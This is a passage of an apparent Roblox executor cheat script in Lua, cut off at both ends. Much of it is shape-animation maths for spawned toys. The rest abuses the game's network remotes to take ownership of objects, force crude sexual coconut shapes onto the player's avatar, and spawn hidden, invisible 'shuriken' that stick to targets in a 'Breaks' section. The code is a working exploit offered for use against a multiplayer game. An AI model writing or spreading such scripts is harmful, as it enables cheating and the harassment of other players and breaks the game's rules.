        elseif i <= coreN + ring1N then
            idx = i - coreN
            a = (idx / ring1N) * TAU + spin
            rr = r * 0.9
            tilt = math.rad(30)
            return Vector3.new(cos(a) * rr, sin(a) * rr * sin(tilt) + h, sin(a) * rr * cos(tilt))
        else
            idx = i - (coreN + ring1N)
            c = math.max(n - (coreN + ring1N), 1)
            a = (idx / c) * TAU + t * sp * 0.5
            rr = r * 1.3
            tilt = math.rad(-40)
            return Vector3.new(cos(a) * rr, sin(a) * rr * sin(tilt) + h, sin(a) * rr * cos(tilt))
        end
    end

    Shapes.Sphere = function(i, n, t, r, h, sp)
        phi = math.acos(1 - 2 * (i / n))
        theta = i * math.pi * (3 - sqrt(5)) + t * sp * 2
        return Vector3.new(cos(theta) * sin(phi) * r, cos(phi) * r + h, sin(theta) * sin(phi) * r)
    end

    Shapes.Cylinder = function(i, n, t, r, h, sp)
        a = baseAngle(i, n, t, sp)
        y = (i / n) * r * 1.5 - r * 0.75
        return Vector3.new(cos(a) * r, h + y, sin(a) * r)
    end

    Shapes["Double Ring"] = function(i, n, t, r, h, sp)
        a = (i / (n / 2)) * TAU + t * sp
        if i % 2 == 0 then
            return Vector3.new(cos(a) * r, h, sin(a) * r)
        else
            return Vector3.new(0, h + cos(a) * r, sin(a) * r)
        end
    end

    Shapes.Star = function(i, n, t, r, h, sp)
        a = baseAngle(i, n, t, sp)
        rr = (i % 2 == 0) and r or r * 0.38
        return Vector3.new(cos(a) * rr, h + sin(t * sp * 1.5 + i * 0.3) * 1.5, sin(a) * rr)
    end

    Shapes.Infinity = function(i, n, t, r, h, sp)
        a = baseAngle(i, n, t, sp)
        d = 1 + sin(a) ^ 2
        return Vector3.new((r * cos(a)) / d, h + sin(t * sp + i * 0.2) * 1.2, (r * sin(a) * cos(a)) / d)
    end

    Shapes.Heart = function(i, n, t, r, h, sp)
        a = baseAngle(i, n, t, sp)
        pulse = 1 + 0.12 * sin(t * sp * 2)
        scale = (r / 15) * pulse
        x = 16 * sin(a) ^ 3
        z = -(13 * cos(a) - 5 * cos(2 * a) - 2 * cos(3 * a) - cos(4 * a))
        return Vector3.new(x * scale, h + sin(t * sp * 2) * 0.5, z * scale)
    end

    Shapes["DNA Helix"] = function(i, n, t, r, h, sp)
        y = (i / n) * r * 2 - r
        a = baseAngle(i, n, t, sp) + y * 0.5
        side = (i % 2 == 0) and 1 or -1
        return Vector3.new(cos(a) * r * side, h + y, sin(a) * r * side)
    end

    Shapes["Triple Helix"] = function(i, n, t, r, h, sp)
        y = (i / n) * r * 2 - r
        a = baseAngle(i, n, t, sp) + y * 0.5
        phase = (i % 3) * (TAU / 3)
        return Vector3.new(cos(a + phase) * r, h + y, sin(a + phase) * r)
    end

    Shapes.Tornado = function(i, n, t, r, h, sp)
        y = (i / n) * r * 2 - r
        rr = ((y + r) / (r * 2)) * r + 2
        a = baseAngle(i, n, t, sp) + y * 0.5
        return Vector3.new(cos(a) * rr, h + y, sin(a) * rr)
    end

    Shapes["Galaxy Spiral"] = function(i, n, t, r, h, sp)
        frac = i / n
        a = frac * 12 + t * sp
        return Vector3.new(cos(a) * r * (frac ^ 1.5), h + sin(t * sp * 2 + frac * 10), sin(a) * r * (frac ^ 1.5))
    end

    Shapes["Fibonacci Spiral"] = function(i, n, t, r, h, sp)
        frac = i / n
        angle = frac * TAU * 6.18 + t * sp
        dist = frac * r
        wave = sin(t * sp + frac * TAU) * 2
        return Vector3.new(cos(angle) * dist, h + wave, sin(angle) * dist)
    end

    Shapes["Spring Coil"] = function(i, n, t, r, h, sp)
        frac = i / n
        a = frac * TAU * 5 + t * sp
        y = frac * r * 2 - r
        return Vector3.new(cos(a) * r * 0.5, h + y, sin(a) * r * 0.5)
    end

    Shapes["Vortex Funnel"] = function(i, n, t, r, h, sp)
        frac = i / n
        a = frac * TAU * 4 + t * sp
        rr = frac * r
        y = (1 - frac) * r * 1.5
        return Vector3.new(cos(a) * rr, h + y, sin(a) * rr)
    end

    Shapes.Seashell = function(i, n, t, r, h, sp)
        frac = i / n
        u = frac * TAU * 3 + t * sp
        v = frac * TAU
        growth = math.exp(0.15 * u)
        x = growth * cos(u) * (1 + cos(v)) * r * 0.15
        y = growth * sin(u) * (1 + cos(v)) * r * 0.15
        z = growth * sin(v) * r * 0.15
        return Vector3.new(x, h + y, z)
    end

    Shapes.Box = function(i, n, t, r, h, sp)
        face = i % 6
        a = baseAngle(i, n, t, sp)
        wb = sin(t * sp + i) * 0.3
        s = r
        edges = {
            Vector3.new(s, sin(a) * s, cos(a) * s),
            Vector3.new(-s, sin(a) * s, cos(a) * s),
            Vector3.new(sin(a) * s, s, cos(a) * s),
            Vector3.new(sin(a) * s, -s, cos(a) * s),
            Vector3.new(sin(a) * s, cos(a) * s, s),
            Vector3.new(sin(a) * s, cos(a) * s, -s),
        }
        v = edges[face + 1]
        return Vector3.new(v.X, v.Y + h + wb, v.Z)
    end

    Shapes["Rounded Cube"] = function(i, n, t, r, h, sp)
        a = baseAngle(i, n, t, sp)
        x = pow(cos(a) * r, 0.85)
        y = pow(sin(a * 1.3) * r * 0.6, 0.85)
        z = pow(cos(a * 0.7) * r, 0.85)
        return Vector3.new(x, y + h, z)
    end

    Shapes.Torus = function(i, n, t, r, h, sp)
        a = baseAngle(i, n, t, sp)
        b = baseAngle(i, n, t * 3, sp)
        R = r
        rt = r * 0.35
        return Vector3.new((R + rt * cos(b)) * cos(a), rt * sin(b) + h, (R + rt * cos(b)) * sin(a))
    end

    Shapes["Torus Knot"] = function(i, n, t, r, h, sp)
        p, q = 2, 3
        a = baseAngle(i, n, t, sp)
        phi = a * q
        R = r * (1 + 0.35 * cos(p * a))
        return Vector3.new(R * cos(phi), r * 0.35 * sin(p * a) + h, R * sin(phi))
    end

    Shapes["Möbius Strip"] = function(i, n, t, r, h, sp)
        frac = i / n
        u = frac * TAU + t * sp
        v = (i % 2 == 0) and 0.5 or -0.5
        w = r * 0.35
        return Vector3.new((r + w * v * cos(u / 2)) * cos(u), w * v * sin(u / 2) + h, (r + w * v * cos(u / 2)) * sin(u))
    end

    Shapes.Saturn = function(i, n, t, r, h, sp)
        spin = t * sp
        if i <= n * 0.6 then
            phi = math.acos(1 - 2 * (i / (n * 0.6)))
            theta = i * math.pi * (3 - sqrt(5)) + spin
            pr = r * 0.45
            return Vector3.new(cos(theta) * sin(phi) * pr, cos(phi) * pr + h, sin(theta) * sin(phi) * pr)
        else
            idx = i - n * 0.6
            c = n - n * 0.6
            a = (idx / c) * TAU + spin
            rr = r * 1.2
            return Vector3.new(cos(a) * rr, sin(a) * rr * sin(math.rad(25)) + h, sin(a) * rr * cos(math.rad(25)))
        end
    end

    Shapes["Ice Cube"] = function(i, n, t, r, h, sp)
        face = i % 6
        frac = (i % math.max(math.floor(n / 6), 1)) / math.max(math.floor(n / 6), 1)
        a = frac * TAU
        s = r * 0.8
        crack = sin(t * sp * 2 + i * 0.5) * 0.4
        pts = {
            Vector3.new(s + crack, cos(a) * s, sin(a) * s),
            Vector3.new(-s - crack, cos(a) * s, sin(a) * s),
            Vector3.new(cos(a) * s, s + crack, sin(a) * s),
            Vector3.new(cos(a) * s, -s - crack, sin(a) * s),
            Vector3.new(cos(a) * s, sin(a) * s, s + crack),
            Vector3.new(cos(a) * s, sin(a) * s, -s - crack),
        }
        v = pts[face + 1]
        return Vector3.new(v.X, v.Y + h, v.Z)
    end

    Shapes["Black Hole"] = function(i, n, t, r, h, sp)
        frac = i / n
        a = frac * TAU * 3 + t * sp
        dist = r * (1 - frac * 0.7)
        suck = sin(t * sp * 2) * 0.5
        return Vector3.new(cos(a) * dist, h + suck * frac * 3, sin(a) * dist)
    end

    Shapes["Hyper Sphere"] = function(i, n, t, r, h, sp)
        phi = math.acos(1 - 2 * (i / n))
        theta = i * math.pi * (3 - sqrt(5)) + t * sp
        pulse = r + sin(t * sp + i * 0.3) * r * 0.25
        return Vector3.new(cos(theta) * sin(phi) * pulse, cos(phi) * pulse + h, sin(theta) * sin(phi) * pulse)
    end

    Shapes["Orbital Rings"] = function(i, n, t, r, h, sp)
        ring = i % 3
        a = baseAngle(i, n, t, sp)
        tilts = { math.rad(0), math.rad(60), math.rad(-60) }
        tilt = tilts[ring + 1]
        return Vector3.new(cos(a) * r, sin(a) * r * sin(tilt) + h, sin(a) * r * cos(tilt))
    end

    Shapes["Lightning Tornado"] = function(i, n, t, r, h, sp)
        y = (i / n) * r * 2 - r
        rr = ((y + r) / (r * 2)) * r + 2
        bolt = sin(i * 7.3 + t * sp * 5) * 3
        a = baseAngle(i, n, t, sp) + y * 0.5
        return Vector3.new(cos(a) * rr + bolt, h + y, sin(a) * rr + bolt)
    end

    Shapes["Plasma Cage"] = function(i, n, t, r, h, sp)
        phi = math.acos(1 - 2 * (i / n))
        theta = i * math.pi * (3 - sqrt(5))
        arc = sin(t * sp * 2 + phi * 6) * r * 0.2
        rr = r + arc
        return Vector3.new(cos(theta) * sin(phi) * rr, cos(phi) * rr + h, sin(theta) * sin(phi) * rr)
    end

    Shapes.Wormhole = function(i, n, t, r, h, sp)
        frac = i / n
        a = frac * TAU + t * sp
        y = (frac - 0.5) * r * 3
        neck = r * (1 - math.exp(-((y / (r * 0.8)) ^ 2))) + 0.5
        return Vector3.new(cos(a) * neck, h + y, sin(a) * neck)
    end

    Shapes["Quantum Lattice"] = function(i, n, t, r, h, sp)
        grid = math.ceil(n ^ (0.3333333333333333))
        gx = i % grid
        gy = math.floor(i / grid) % grid
        gz = math.floor(i / (grid * grid)) % grid
        scale = r * 2 / grid
        jitter = sin(t * sp + i * 1.7) * 0.3
        return Vector3.new((gx - grid / 2) * scale + jitter, (gy - grid / 2) * scale + h, (gz - grid / 2) * scale + jitter)
    end

    Shapes["Neutron Burst"] = function(i, n, t, r, h, sp)
        phi = math.acos(1 - 2 * (i / n))
        theta = i * math.pi * (3 - sqrt(5))
        burst = r * abs(sin(t * sp + i * 0.4))
        return Vector3.new(cos(theta) * sin(phi) * burst, cos(phi) * burst + h, sin(theta) * sin(phi) * burst)
    end

    Shapes["Arc Discharge"] = function(i, n, t, r, h, sp)
        frac = i / n
        a = frac * TAU
        arc = sin(frac * math.pi) * r
        zap = sin(t * sp * 8 + i * 2.1) * r * 0.15
        return Vector3.new(cos(a) * r + zap, h + arc + zap, sin(a) * r + zap)
    end

    Shapes["Event Horizon"] = function(i, n, t, r, h, sp)
        frac = i / n
        a = frac * TAU * 5 + t * sp
        dist = r * (0.2 + 0.8 * abs(sin(frac * math.pi)))
        warp = sin(t * sp * 3 + frac * TAU) * r * 0.1
        return Vector3.new(cos(a) * dist, h + warp, sin(a) * dist)
    end

    Shapes.Butterfly = function(i, n, t, r, h, sp)
        a = baseAngle(i, n, t, sp * 0.5)
        ex = math.exp(cos(a)) - 2 * cos(4 * a) - sin(a / 12) ^ 5
        rr = ex * r * 0.4
        return Vector3.new(cos(a) * rr, h + sin(t * sp + i * 0.1) * 1.5, sin(a) * rr)
    end

    Shapes["Rose Petal"] = function(i, n, t, r, h, sp)
        k = 5
        a = baseAngle(i, n, t, sp * 0.3)
        rr = r * cos(k * a)
        return Vector3.new(cos(a) * rr, h + sin(t * sp + i * 0.2) * 2, sin(a) * rr)
    end

    Shapes.Snowflake = function(i, n, t, r, h, sp)
        arm = i % 6
        frac = (i % math.max(math.floor(n / 6), 1)) / math.max(math.floor(n / 6), 1)
        baseA = arm * (TAU / 6) + t * sp * 0.2
        dist = frac * r
        branch = sin(frac * math.pi * 4) * r * 0.2
        return Vector3.new(cos(baseA) * dist + cos(baseA + math.pi / 2) * branch, h + cos(t * sp) * 0.5, sin(baseA) * dist + sin(baseA + math.pi / 2) * branch)
    end

    Shapes["Crystal Bloom"] = function(i, n, t, r, h, sp)
        petals = 8
        arm = i % petals
        frac = (i % math.max(math.floor(n / petals), 1)) / math.max(math.floor(n / petals), 1)
        baseA = arm * (TAU / petals) + t * sp * 0.3
        dist = frac * r
        lift = sin(frac * math.pi) * r * 0.5
        return Vector3.new(cos(baseA) * dist, h + lift, sin(baseA) * dist)
    end

    Shapes["Vine Wrap"] = function(i, n, t, r, h, sp)
        frac = i / n
        turns = 4
        a = frac * TAU * turns + t * sp
        y = frac * r * 2 - r
        bulge = 1 + 0.3 * sin(frac * TAU * turns * 2)
        rr = r * 0.5 * bulge
        return Vector3.new(cos(a) * rr, h + y, sin(a) * rr)
    end

    Shapes["Flower Bloom"] = function(i, n, t, r, h, sp)
        petals = 6
        a = baseAngle(i, n, t, sp * 0.4)
        rr = r * abs(cos(petals * a * 0.5))
        bloom = 1 + 0.2 * sin(t * sp * 2)
        return Vector3.new(cos(a) * rr * bloom, h + sin(t * sp + a) * 1.5, sin(a) * rr * bloom)
    end

    Shapes.Jellyfish = function(i, n, t, r, h, sp)
        bell = math.floor(n * 0.4)
        if i <= bell then
            phi = (i / bell) * math.pi * 0.5
            theta = baseAngle(i, bell, t, sp)
            pulse = r * (1 + 0.2 * sin(t * sp * 3))
            return Vector3.new(cos(theta) * sin(phi) * pulse, cos(phi) * pulse * 0.5 + h, sin(theta) * sin(phi) * pulse)
        else
            idx = i - bell
            c = n - bell
            a = (idx / c) * TAU + t * sp
            drop = (idx / c) * r * 1.5
            wave = sin(t * sp * 4 + a * 3) * r * 0.15
            return Vector3.new(cos(a) * r * 0.2 + wave, h - drop, sin(a) * r * 0.2 + wave)
        end
    end

    Shapes["Coral Reef"] = function(i, n, t, r, h, sp)
        a = baseAngle(i, n, t, sp * 0.2)
        frac = i / n
        y = sin(frac * TAU * 3 + t * sp) * r * 0.8
        rr = r * (0.5 + 0.5 * sin(frac * TAU * 5))
        sway = sin(t * sp + frac * 12) * r * 0.1
        return Vector3.new(cos(a) * rr + sway, h + y, sin(a) * rr + sway)
    end

    Shapes["Volcano Burst"] = function(i, n, t, r, h, sp)
        a = baseAngle(i, n, t, sp)
        burst = abs(sin(t * sp + i)) * r * 2
        return Vector3.new(cos(a) * burst, h + burst, sin(a) * burst)
    end

    Shapes["Cosmic Explosion"] = function(i, n, t, r, h, sp)
        a = baseAngle(i, n, t, sp)
        wave = abs(sin(t * sp * 2 - i * 0.1))
        return Vector3.new(cos(a) * r * wave * 3, h + wave * 5, sin(a) * r * wave * 3)
    end

    Shapes.Supernova = function(i, n, t, r, h, sp)
        phi = math.acos(1 - 2 * (i / n))
        theta = i * math.pi * (3 - sqrt(5)) + t * sp
        blast = r * (1 + sin(t * sp * 0.5) * 0.5)
        eject = sin(phi * 3 + t * sp * 4) * r * 0.3
        return Vector3.new(cos(theta) * sin(phi) * (blast + eject), cos(phi) * (blast + eject) + h, sin(theta) * sin(phi) * (blast + eject))
    end

    Shapes["Firework Pop"] = function(i, n, t, r, h, sp)
        phi = math.acos(1 - 2 * (i / n))
        theta = i * math.pi * (3 - sqrt(5))
        trail = abs(sin(t * sp * 3 + i * 0.7))
        rr = r * trail
        sparkle = sin(t * sp * 10 + i) * 0.8
        return Vector3.new(cos(theta) * sin(phi) * rr, cos(phi) * rr + h + sparkle, sin(theta) * sin(phi) * rr)
    end

    Shapes.Shockwave = function(i, n, t, r, h, sp)
        a = baseAngle(i, n, t, sp)
        ring = sin(t * sp * 3) * r
        y = cos(t * sp * 2 + i * 0.2) * r * 0.3
        return Vector3.new(cos(a) * ring, h + y, sin(a) * ring)
    end

    Shapes.Lissajous = function(i, n, t, r, h, sp)
        a = baseAngle(i, n, t, sp)
        p, q = 3, 2
        d = math.pi / 2
        return Vector3.new(r * sin(p * a + d), h + r * 0.4 * sin(t * sp + i * 0.1), r * sin(q * a))
    end

    Shapes.Hypotrochoid = function(i, n, t, r, h, sp)
        R, rd, d = r, r * 0.4, r * 0.7
        a = baseAngle(i, n, t, sp)
        x = (R - rd) * cos(a) + d * cos((R - rd) / rd * a)
        z = (R - rd) * sin(a) - d * sin((R - rd) / rd * a)
        return Vector3.new(x * 0.7, h + sin(t * sp + i * 0.2) * 2, z * 0.7)
    end

    Shapes.Epitrochoid = function(i, n, t, r, h, sp)
        R, rd, d = r * 0.6, r * 0.35, r * 0.5
        a = baseAngle(i, n, t, sp)
        x = (R + rd) * cos(a) - d * cos((R + rd) / rd * a)
        z = (R + rd) * sin(a) - d * sin((R + rd) / rd * a)
        return Vector3.new(x * 0.7, h + sin(t * sp + i * 0.15) * 2, z * 0.7)
    end

    Shapes.Trefoil = function(i, n, t, r, h, sp)
        a = baseAngle(i, n, t, sp)
        x = sin(a) + 2 * sin(2 * a)
        y = cos(a) - 2 * cos(2 * a)
        z = -sin(3 * a)
        sc = r / 3
        return Vector3.new(x * sc, y * sc + h, z * sc)
    end

    Shapes["Klein Bottle Slice"] = function(i, n, t, r, h, sp)
        u = baseAngle(i, n, t, sp)
        v = baseAngle(i, math.max(n, 1), t * 2, sp)
        a = r * 0.3
        x = (a + a * cos(v)) * cos(u)
        y = (a + a * cos(v)) * sin(u)
        z = a * sin(v) + sin(t * sp + i * 0.2) * 2
        return Vector3.new(x, y + h, z)
    end

    Shapes.Harmonograph = function(i, n, t, r, h, sp)
        frac = i / n
        decay = math.exp(-frac * 0.5)
        f1, f2, f3, f4 = 3, 2, 3, 2
        p1, p2 = math.pi / 4, math.pi / 6
        a = frac * TAU * 8 + t * sp
        x = r * decay * (sin(f1 * a + p1) + sin(f2 * a))
        z = r * decay * (sin(f3 * a + p2) + sin(f4 * a))
        return Vector3.new(x * 0.5, h + sin(t * sp + frac * 12) * 1.5, z * 0.5)
    end

    function GetShapeOffset(index, total, t, cfg)
        fn = Shapes[cfg.CurrentShape]
        if fn then
            return fn(index, total, t, cfg.Radius, cfg.Height, cfg.Speed)
        end
        a = (index / total) * TAU + t * cfg.Speed
        return Vector3.new(cos(a) * cfg.Radius, cfg.Height, sin(a) * cfg.Radius)
    end

    SparklerGroup:CreateButton({
        Name = "Synchronize All Sparklers",
        Callback = function()
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj.Name:find("FireworkSparkler") then
                    SetupPhysics(obj, activeSparklers)
                end
            end
        end
    })

    SparklerGroup:CreateButton({
        Name = "Unsynchronize All Sparklers",
        Callback = function()
            activeSparklers = {}
        end
    })

    SparklerGroup:CreateSlider({
        Name = "Height Offset",
        Default = 5,
        Min = -20,
        Max = 150,
        Callback = function(v)
            sparklerConfig.Height = v
        end
    })

    SparklerGroup:CreateSlider({
        Name = "Shape Radius",
        Default = 15,
        Min = 2,
        Max = 100,
        Callback = function(v)
            sparklerConfig.Radius = v
        end
    })

    SparklerGroup:CreateSlider({
        Name = "Rotation Speed",
        Default = 2,
        Min = 0,
        Max = 20,
        Callback = function(v)
            sparklerConfig.Speed = v
        end
    })

    SparklerGroup:CreateDropdown({
        Name = "Select Shape",
        Items = shapeOptions,
        Default = "Planet",
        Callback = function(v)
            sparklerConfig.CurrentShape = v
        end
    })

    RunService.RenderStepped:Connect(function()
        char = LocalPlayer.Character
        targetRoot = char and char:FindFirstChild("HumanoidRootPart")
        if not targetRoot then return end

        t = tick()
        prediction = targetRoot.AssemblyLinearVelocity * 0.12
        rot = targetRoot.CFrame.Rotation

        for i = #activeSparklers, 1, -1 do
            obj = activeSparklers[i]
            if obj and obj.Parent then
                main = obj:IsA("BasePart") and obj or obj.PrimaryPart
                bp = main and main:FindFirstChild("ToyBodyPos")
                bg = main and main:FindFirstChild("ToyBodyGyro")
                if bp and bg then
                    offset = GetShapeOffset(i, #activeSparklers, t, sparklerConfig)
                    bp.Position = targetRoot.Position + prediction + (rot * offset)
                    bg.CFrame = CFrame.new(main.Position, targetRoot.Position + prediction)
                end
            else
                table.remove(activeSparklers, i)
            end
        end
    end)
end

do

    local CoconutEnabled = false
    local CoconutBodyEnabled = false
    local CoconutAmount = 10
    local CoconutDamping = 100

    SparklerGroup:CreateToggle({
        Name = "Coconut Penis",
        Tooltip = "Makes a dick out of coconuts",
        Default = false,
        Callback = function(Value)
            CoconutEnabled = Value

            if Value then
                task.spawn(function()
                    local Me = game:GetService("Players").LocalPlayer
                    local ReplicatedStorage = game:GetService("ReplicatedStorage")
                    local SetNetworkOwner = ReplicatedStorage.GrabEvents.SetNetworkOwner
                    local SpawnToy = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
                    local DestroyToy = ReplicatedStorage.MenuToys.DestroyToy
                    local Offsets = {
                        [1] = CFrame.new(-0.45, -1.2, -0.7),
                        [2] = CFrame.new(0.45, -1.2, -0.7),
                        [3] = CFrame.new(0, -1, 0.8),
                    }
                    local Coconuts = {}

                    while CoconutEnabled do
                        local Character = Me.Character
                        local Root = Character and Character:FindFirstChild("HumanoidRootPart")

                        if not Root then
                            task.wait(0.1)
                            continue
                        end

                        local Folder = workspace:FindFirstChild(Me.Name .. "SpawnedInToys")

                        if not Folder then
                            task.wait(0.1)
                            continue
                        end

                        table.clear(Coconuts)

                        for _, Toy in ipairs(Folder:GetChildren()) do
                            if Toy.Name == "FoodCoconut" then
                                table.insert(Coconuts, Toy)
                            end
                        end

                        if #Coconuts < (CoconutAmount + 2) then
                            task.spawn(function()
                                SpawnToy:InvokeServer("FoodCoconut", Root.CFrame * CFrame.new(-5, 0, 10), Vector3.zero)
                            end)
                        end

                        for i, Coconut in ipairs(Coconuts) do
                            local Part = Coconut:FindFirstChild("SoundPart")
                            local HoldPart = Coconut:FindFirstChild("HoldPart")
                            local Rigid = HoldPart and HoldPart:FindFirstChild("RigidConstraint")
                            local PartOwner = Part and Part:FindFirstChild("PartOwner")

                            if Part and HoldPart and Rigid then
                                if PartOwner and PartOwner.Value == Me.Name then
                                    if i <= 2 then
                                        Part.CFrame = Root.CFrame * Offsets[i] * CFrame.new(Root.Velocity / CoconutDamping)
                                    else
                                        Part.CFrame = Root.CFrame * Offsets[3] * CFrame.new(Root.Velocity / CoconutDamping) * CFrame.new(0, 0, Offsets[3].Z - (i + 0.2))
                                    end

                                    Part.Velocity = Vector3.zero
                                else
                                    SetNetworkOwner:FireServer(Part, Part.CFrame)
                                end
                                if Rigid.Attachment1 then
                                    DestroyToy:FireServer(Coconut)
                                end

                                for _, PartObj in ipairs(Coconut:GetChildren()) do
                                    if PartObj:IsA("BasePart") then
                                        PartObj.CanCollide = false
                                        PartObj.CanQuery = false

                                        if PartObj.Transparency ~= 1 then
                                            PartObj.Transparency = 0
                                        end
                                    end
                                end
                            end
                        end

                        task.wait(0.01)
                    end
                end)
            end
        end
    })

    SparklerGroup:CreateToggle({
        Name = "Coconut Boobs and Ass",
        Tooltip = "Places coconuts on your chest and ass",
        Default = false,
        Callback = function(Value)
            CoconutBodyEnabled = Value

            if Value then
                task.spawn(function()
                    local Me = game:GetService("Players").LocalPlayer
                    local ReplicatedStorage = game:GetService("ReplicatedStorage")
                    local SetNetworkOwner = ReplicatedStorage.GrabEvents.SetNetworkOwner
                    local SpawnToy = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
                    local DestroyToy = ReplicatedStorage.MenuToys.DestroyToy
                    local Coconuts = {}

                    while CoconutBodyEnabled do
                        local Character = Me.Character
                        local Root = Character and Character:FindFirstChild("HumanoidRootPart")

                        if not Root then
                            task.wait(0.1)
                            continue
                        end

                        local Folder = workspace:FindFirstChild(Me.Name .. "SpawnedInToys")

                        if not Folder then
                            task.wait(0.1)
                            continue
                        end

                        table.clear(Coconuts)

                        for _, Toy in ipairs(Folder:GetChildren()) do
                            if Toy.Name == "FoodCoconut" then
                                table.insert(Coconuts, Toy)
                            end
                        end

                        if #Coconuts < 4 then
                            for _ = 1, 4 - #Coconuts do
                                task.spawn(function()
                                    SpawnToy:InvokeServer("FoodCoconut", Root.CFrame * CFrame.new(-5, 0, 10), Vector3.zero)
                                end)
                            end
                        end

                        for i = 1, math.min(4, #Coconuts) do
                            local Coconut = Coconuts[i]
                            local Part = Coconut:FindFirstChild("SoundPart")
                            local HoldPart = Coconut:FindFirstChild("HoldPart")
                            local Rigid = HoldPart and HoldPart:FindFirstChild("RigidConstraint")
                            local PartOwner = Part and Part:FindFirstChild("PartOwner")

                            if Part and HoldPart and Rigid then
                                if PartOwner and PartOwner.Value == Me.Name then
                                    local TargetCF

                                    if i == 1 then
                                        TargetCF = Root.CFrame * CFrame.new(-0.4, 0.3, -0.55)
                                    elseif i == 2 then
                                        TargetCF = Root.CFrame * CFrame.new(0.4, 0.3, -0.55)
                                    elseif i == 3 then
                                        TargetCF = Root.CFrame * CFrame.new(-0.35, -1.1, 0.45)
                                    else
                                        TargetCF = Root.CFrame * CFrame.new(0.35, -1.1, 0.45)
                                    end

                                    Part.CFrame = TargetCF
                                    Part.Velocity = Vector3.zero
                                else
                                    SetNetworkOwner:FireServer(Part, Part.CFrame)
                                end
                                if Rigid.Attachment1 then
                                    DestroyToy:FireServer(Coconut)
                                end

                                for _, PartObj in ipairs(Coconut:GetChildren()) do
                                    if PartObj:IsA("BasePart") then
                                        PartObj.CanCollide = false
                                        PartObj.CanQuery = false

                                        if PartObj.Transparency ~= 1 then
                                            PartObj.Transparency = 0
                                        end
                                    end
                                end
                            end
                        end

                        task.wait(0.01)
                    end
                end)
            end
        end
    })

    SparklerGroup:CreateSlider({
        Name = "Coconut Amount",
        Default = 10,
        Min = 3,
        Max = 25,
        Callback = function(v)
            CoconutAmount = v
        end
    })

    SparklerGroup:CreateSlider({
        Name = "Damping",
        Default = 100,
        Min = 1,
        Max = 500,
        Callback = function(v)
            CoconutDamping = v
        end
    })
end

local MiscGroup = Tabs.Misc:CreateBlock({Name = "Breaks", Side = "Left"})

do
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Workspace = game:GetService("Workspace")
    local Players = game:GetService("Players")

    local LocalPlayer = Players.LocalPlayer

    local SpawnToyRemote = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
    local DestroyToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
    local SetNetworkOwner = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
    local DestroyGrabLine = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("DestroyGrabLine")
    local StickyPartEvent = ReplicatedStorage:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")

    local currentGrabbedHighlight = nil

    getgenv().getCurrentToyFolder2 = getgenv().getCurrentToyFolder2 or function()
        local inPlot = LocalPlayer:FindFirstChild("InPlot")
        if inPlot and inPlot.Value then
            local plots = Workspace:FindFirstChild("Plots")
            if plots then
                for i = 1, 5 do
                    local p = plots:FindFirstChild("Plot"..i)
                    if p and p:FindFirstChild("PlotSign") then
                        local sign = p.PlotSign
                        for _, name in ipairs({"ThisPlotsOwners","ThisPlotsOwner","ThisPlotOwners"}) do
                            local c = sign:FindFirstChild(name)
                            if c then
                                local owner = c:IsA("StringValue") and c or c:FindFirstChildOfClass("StringValue")
                                if owner and owner.Value == LocalPlayer.Name then
                                    return Workspace.PlotItems:FindFirstChild("Plot"..i)
                                end
                            end
                        end
                    end
                end
            end
        end
        return Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
    end

    local function GetFolder()
        return getgenv().getCurrentToyFolder2()
    end

    local function HideShuriken(shuriken)
        pcall(function()
            for _, v in ipairs(shuriken:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.CanTouch = false
                    v.CanCollide = false
                    v.CanQuery = false
                    v.Transparency = 1
                end
            end
        end)
    end

    local function WaitForNewShuriken(timeout, activeCheck, existing)
        timeout = timeout or 5
        local folder = GetFolder()
        if not folder then return nil end

        local result = nil
        local conn = folder.ChildAdded:Connect(function(child)
            if child.Name == "ToolPencil" and not result and not (existing and existing[child]) then
                result = child
            end
        end)

        local start = tick()
        while not result and (tick() - start < timeout) do
            if activeCheck and not activeCheck() then
                conn:Disconnect()
                return nil
            end
            task.wait()
        end
        conn:Disconnect()
        return result
    end

    local function SpawnShuriken()
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        task.spawn(function()
            local cf = hrp.CFrame * CFrame.Angles(-0.605224, -0.321753, 0)
            SpawnToyRemote:InvokeServer("ToolPencil", cf, Vector3.new(0, 25.02, 0))
        end)
    end

    local function CreateAndOwnShuriken(activeCheck)
        local folder = GetFolder()
        local existing = {}
        if folder then
            for _, v in ipairs(folder:GetChildren()) do
                if v.Name == "ToolPencil" then existing[v] = true end
            end
        end

        while activeCheck == nil or activeCheck() do
            SpawnShuriken()
            local shuriken = WaitForNewShuriken(4, activeCheck, existing)
            if not shuriken then
                if activeCheck and not activeCheck() then return nil end
                task.wait(0.25)
                continue
            end

            task.wait(0.08)
            HideShuriken(shuriken)

            local soundPart = shuriken:FindFirstChild("SoundPart") or shuriken:FindFirstChildOfClass("BasePart")
            if not soundPart then
                pcall(function() DestroyToy:FireServer(shuriken) end)
                task.wait(0.2)
                continue
            end

            SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
            task.wait(0.12)

            if activeCheck and not activeCheck() then
                pcall(function() DestroyToy:FireServer(shuriken) end)
                return nil
            end

            local owner = soundPart:FindFirstChild("PartOwner")
            if owner and owner.Value == LocalPlayer.Name then
                return shuriken
            else
                pcall(function() DestroyToy:FireServer(shuriken) end)
                task.wait(0.25)
            end
        end
        return nil
    end

    local function GetStickyPart(shuriken)
        return shuriken:FindFirstChild("StickyPart") or shuriken:FindFirstChildOfClass("BasePart")
    end

    local function StickShurikenToTarget(shuriken, target, cf)
        local stickyPart = GetStickyPart(shuriken)
        if not stickyPart or not target then return end
        pcall(function()
            DestroyGrabLine:FireServer(shuriken:FindFirstChildOfClass("BasePart"))
        end)
        pcall(function()
            StickyPartEvent:FireServer(table.unpack({
                [1] = stickyPart,
                [2] = target,
                [3] = cf,
            }))
        end)
    end

    local function GetGrabbedPart()
        local g = Workspace:FindFirstChild("GrabParts")
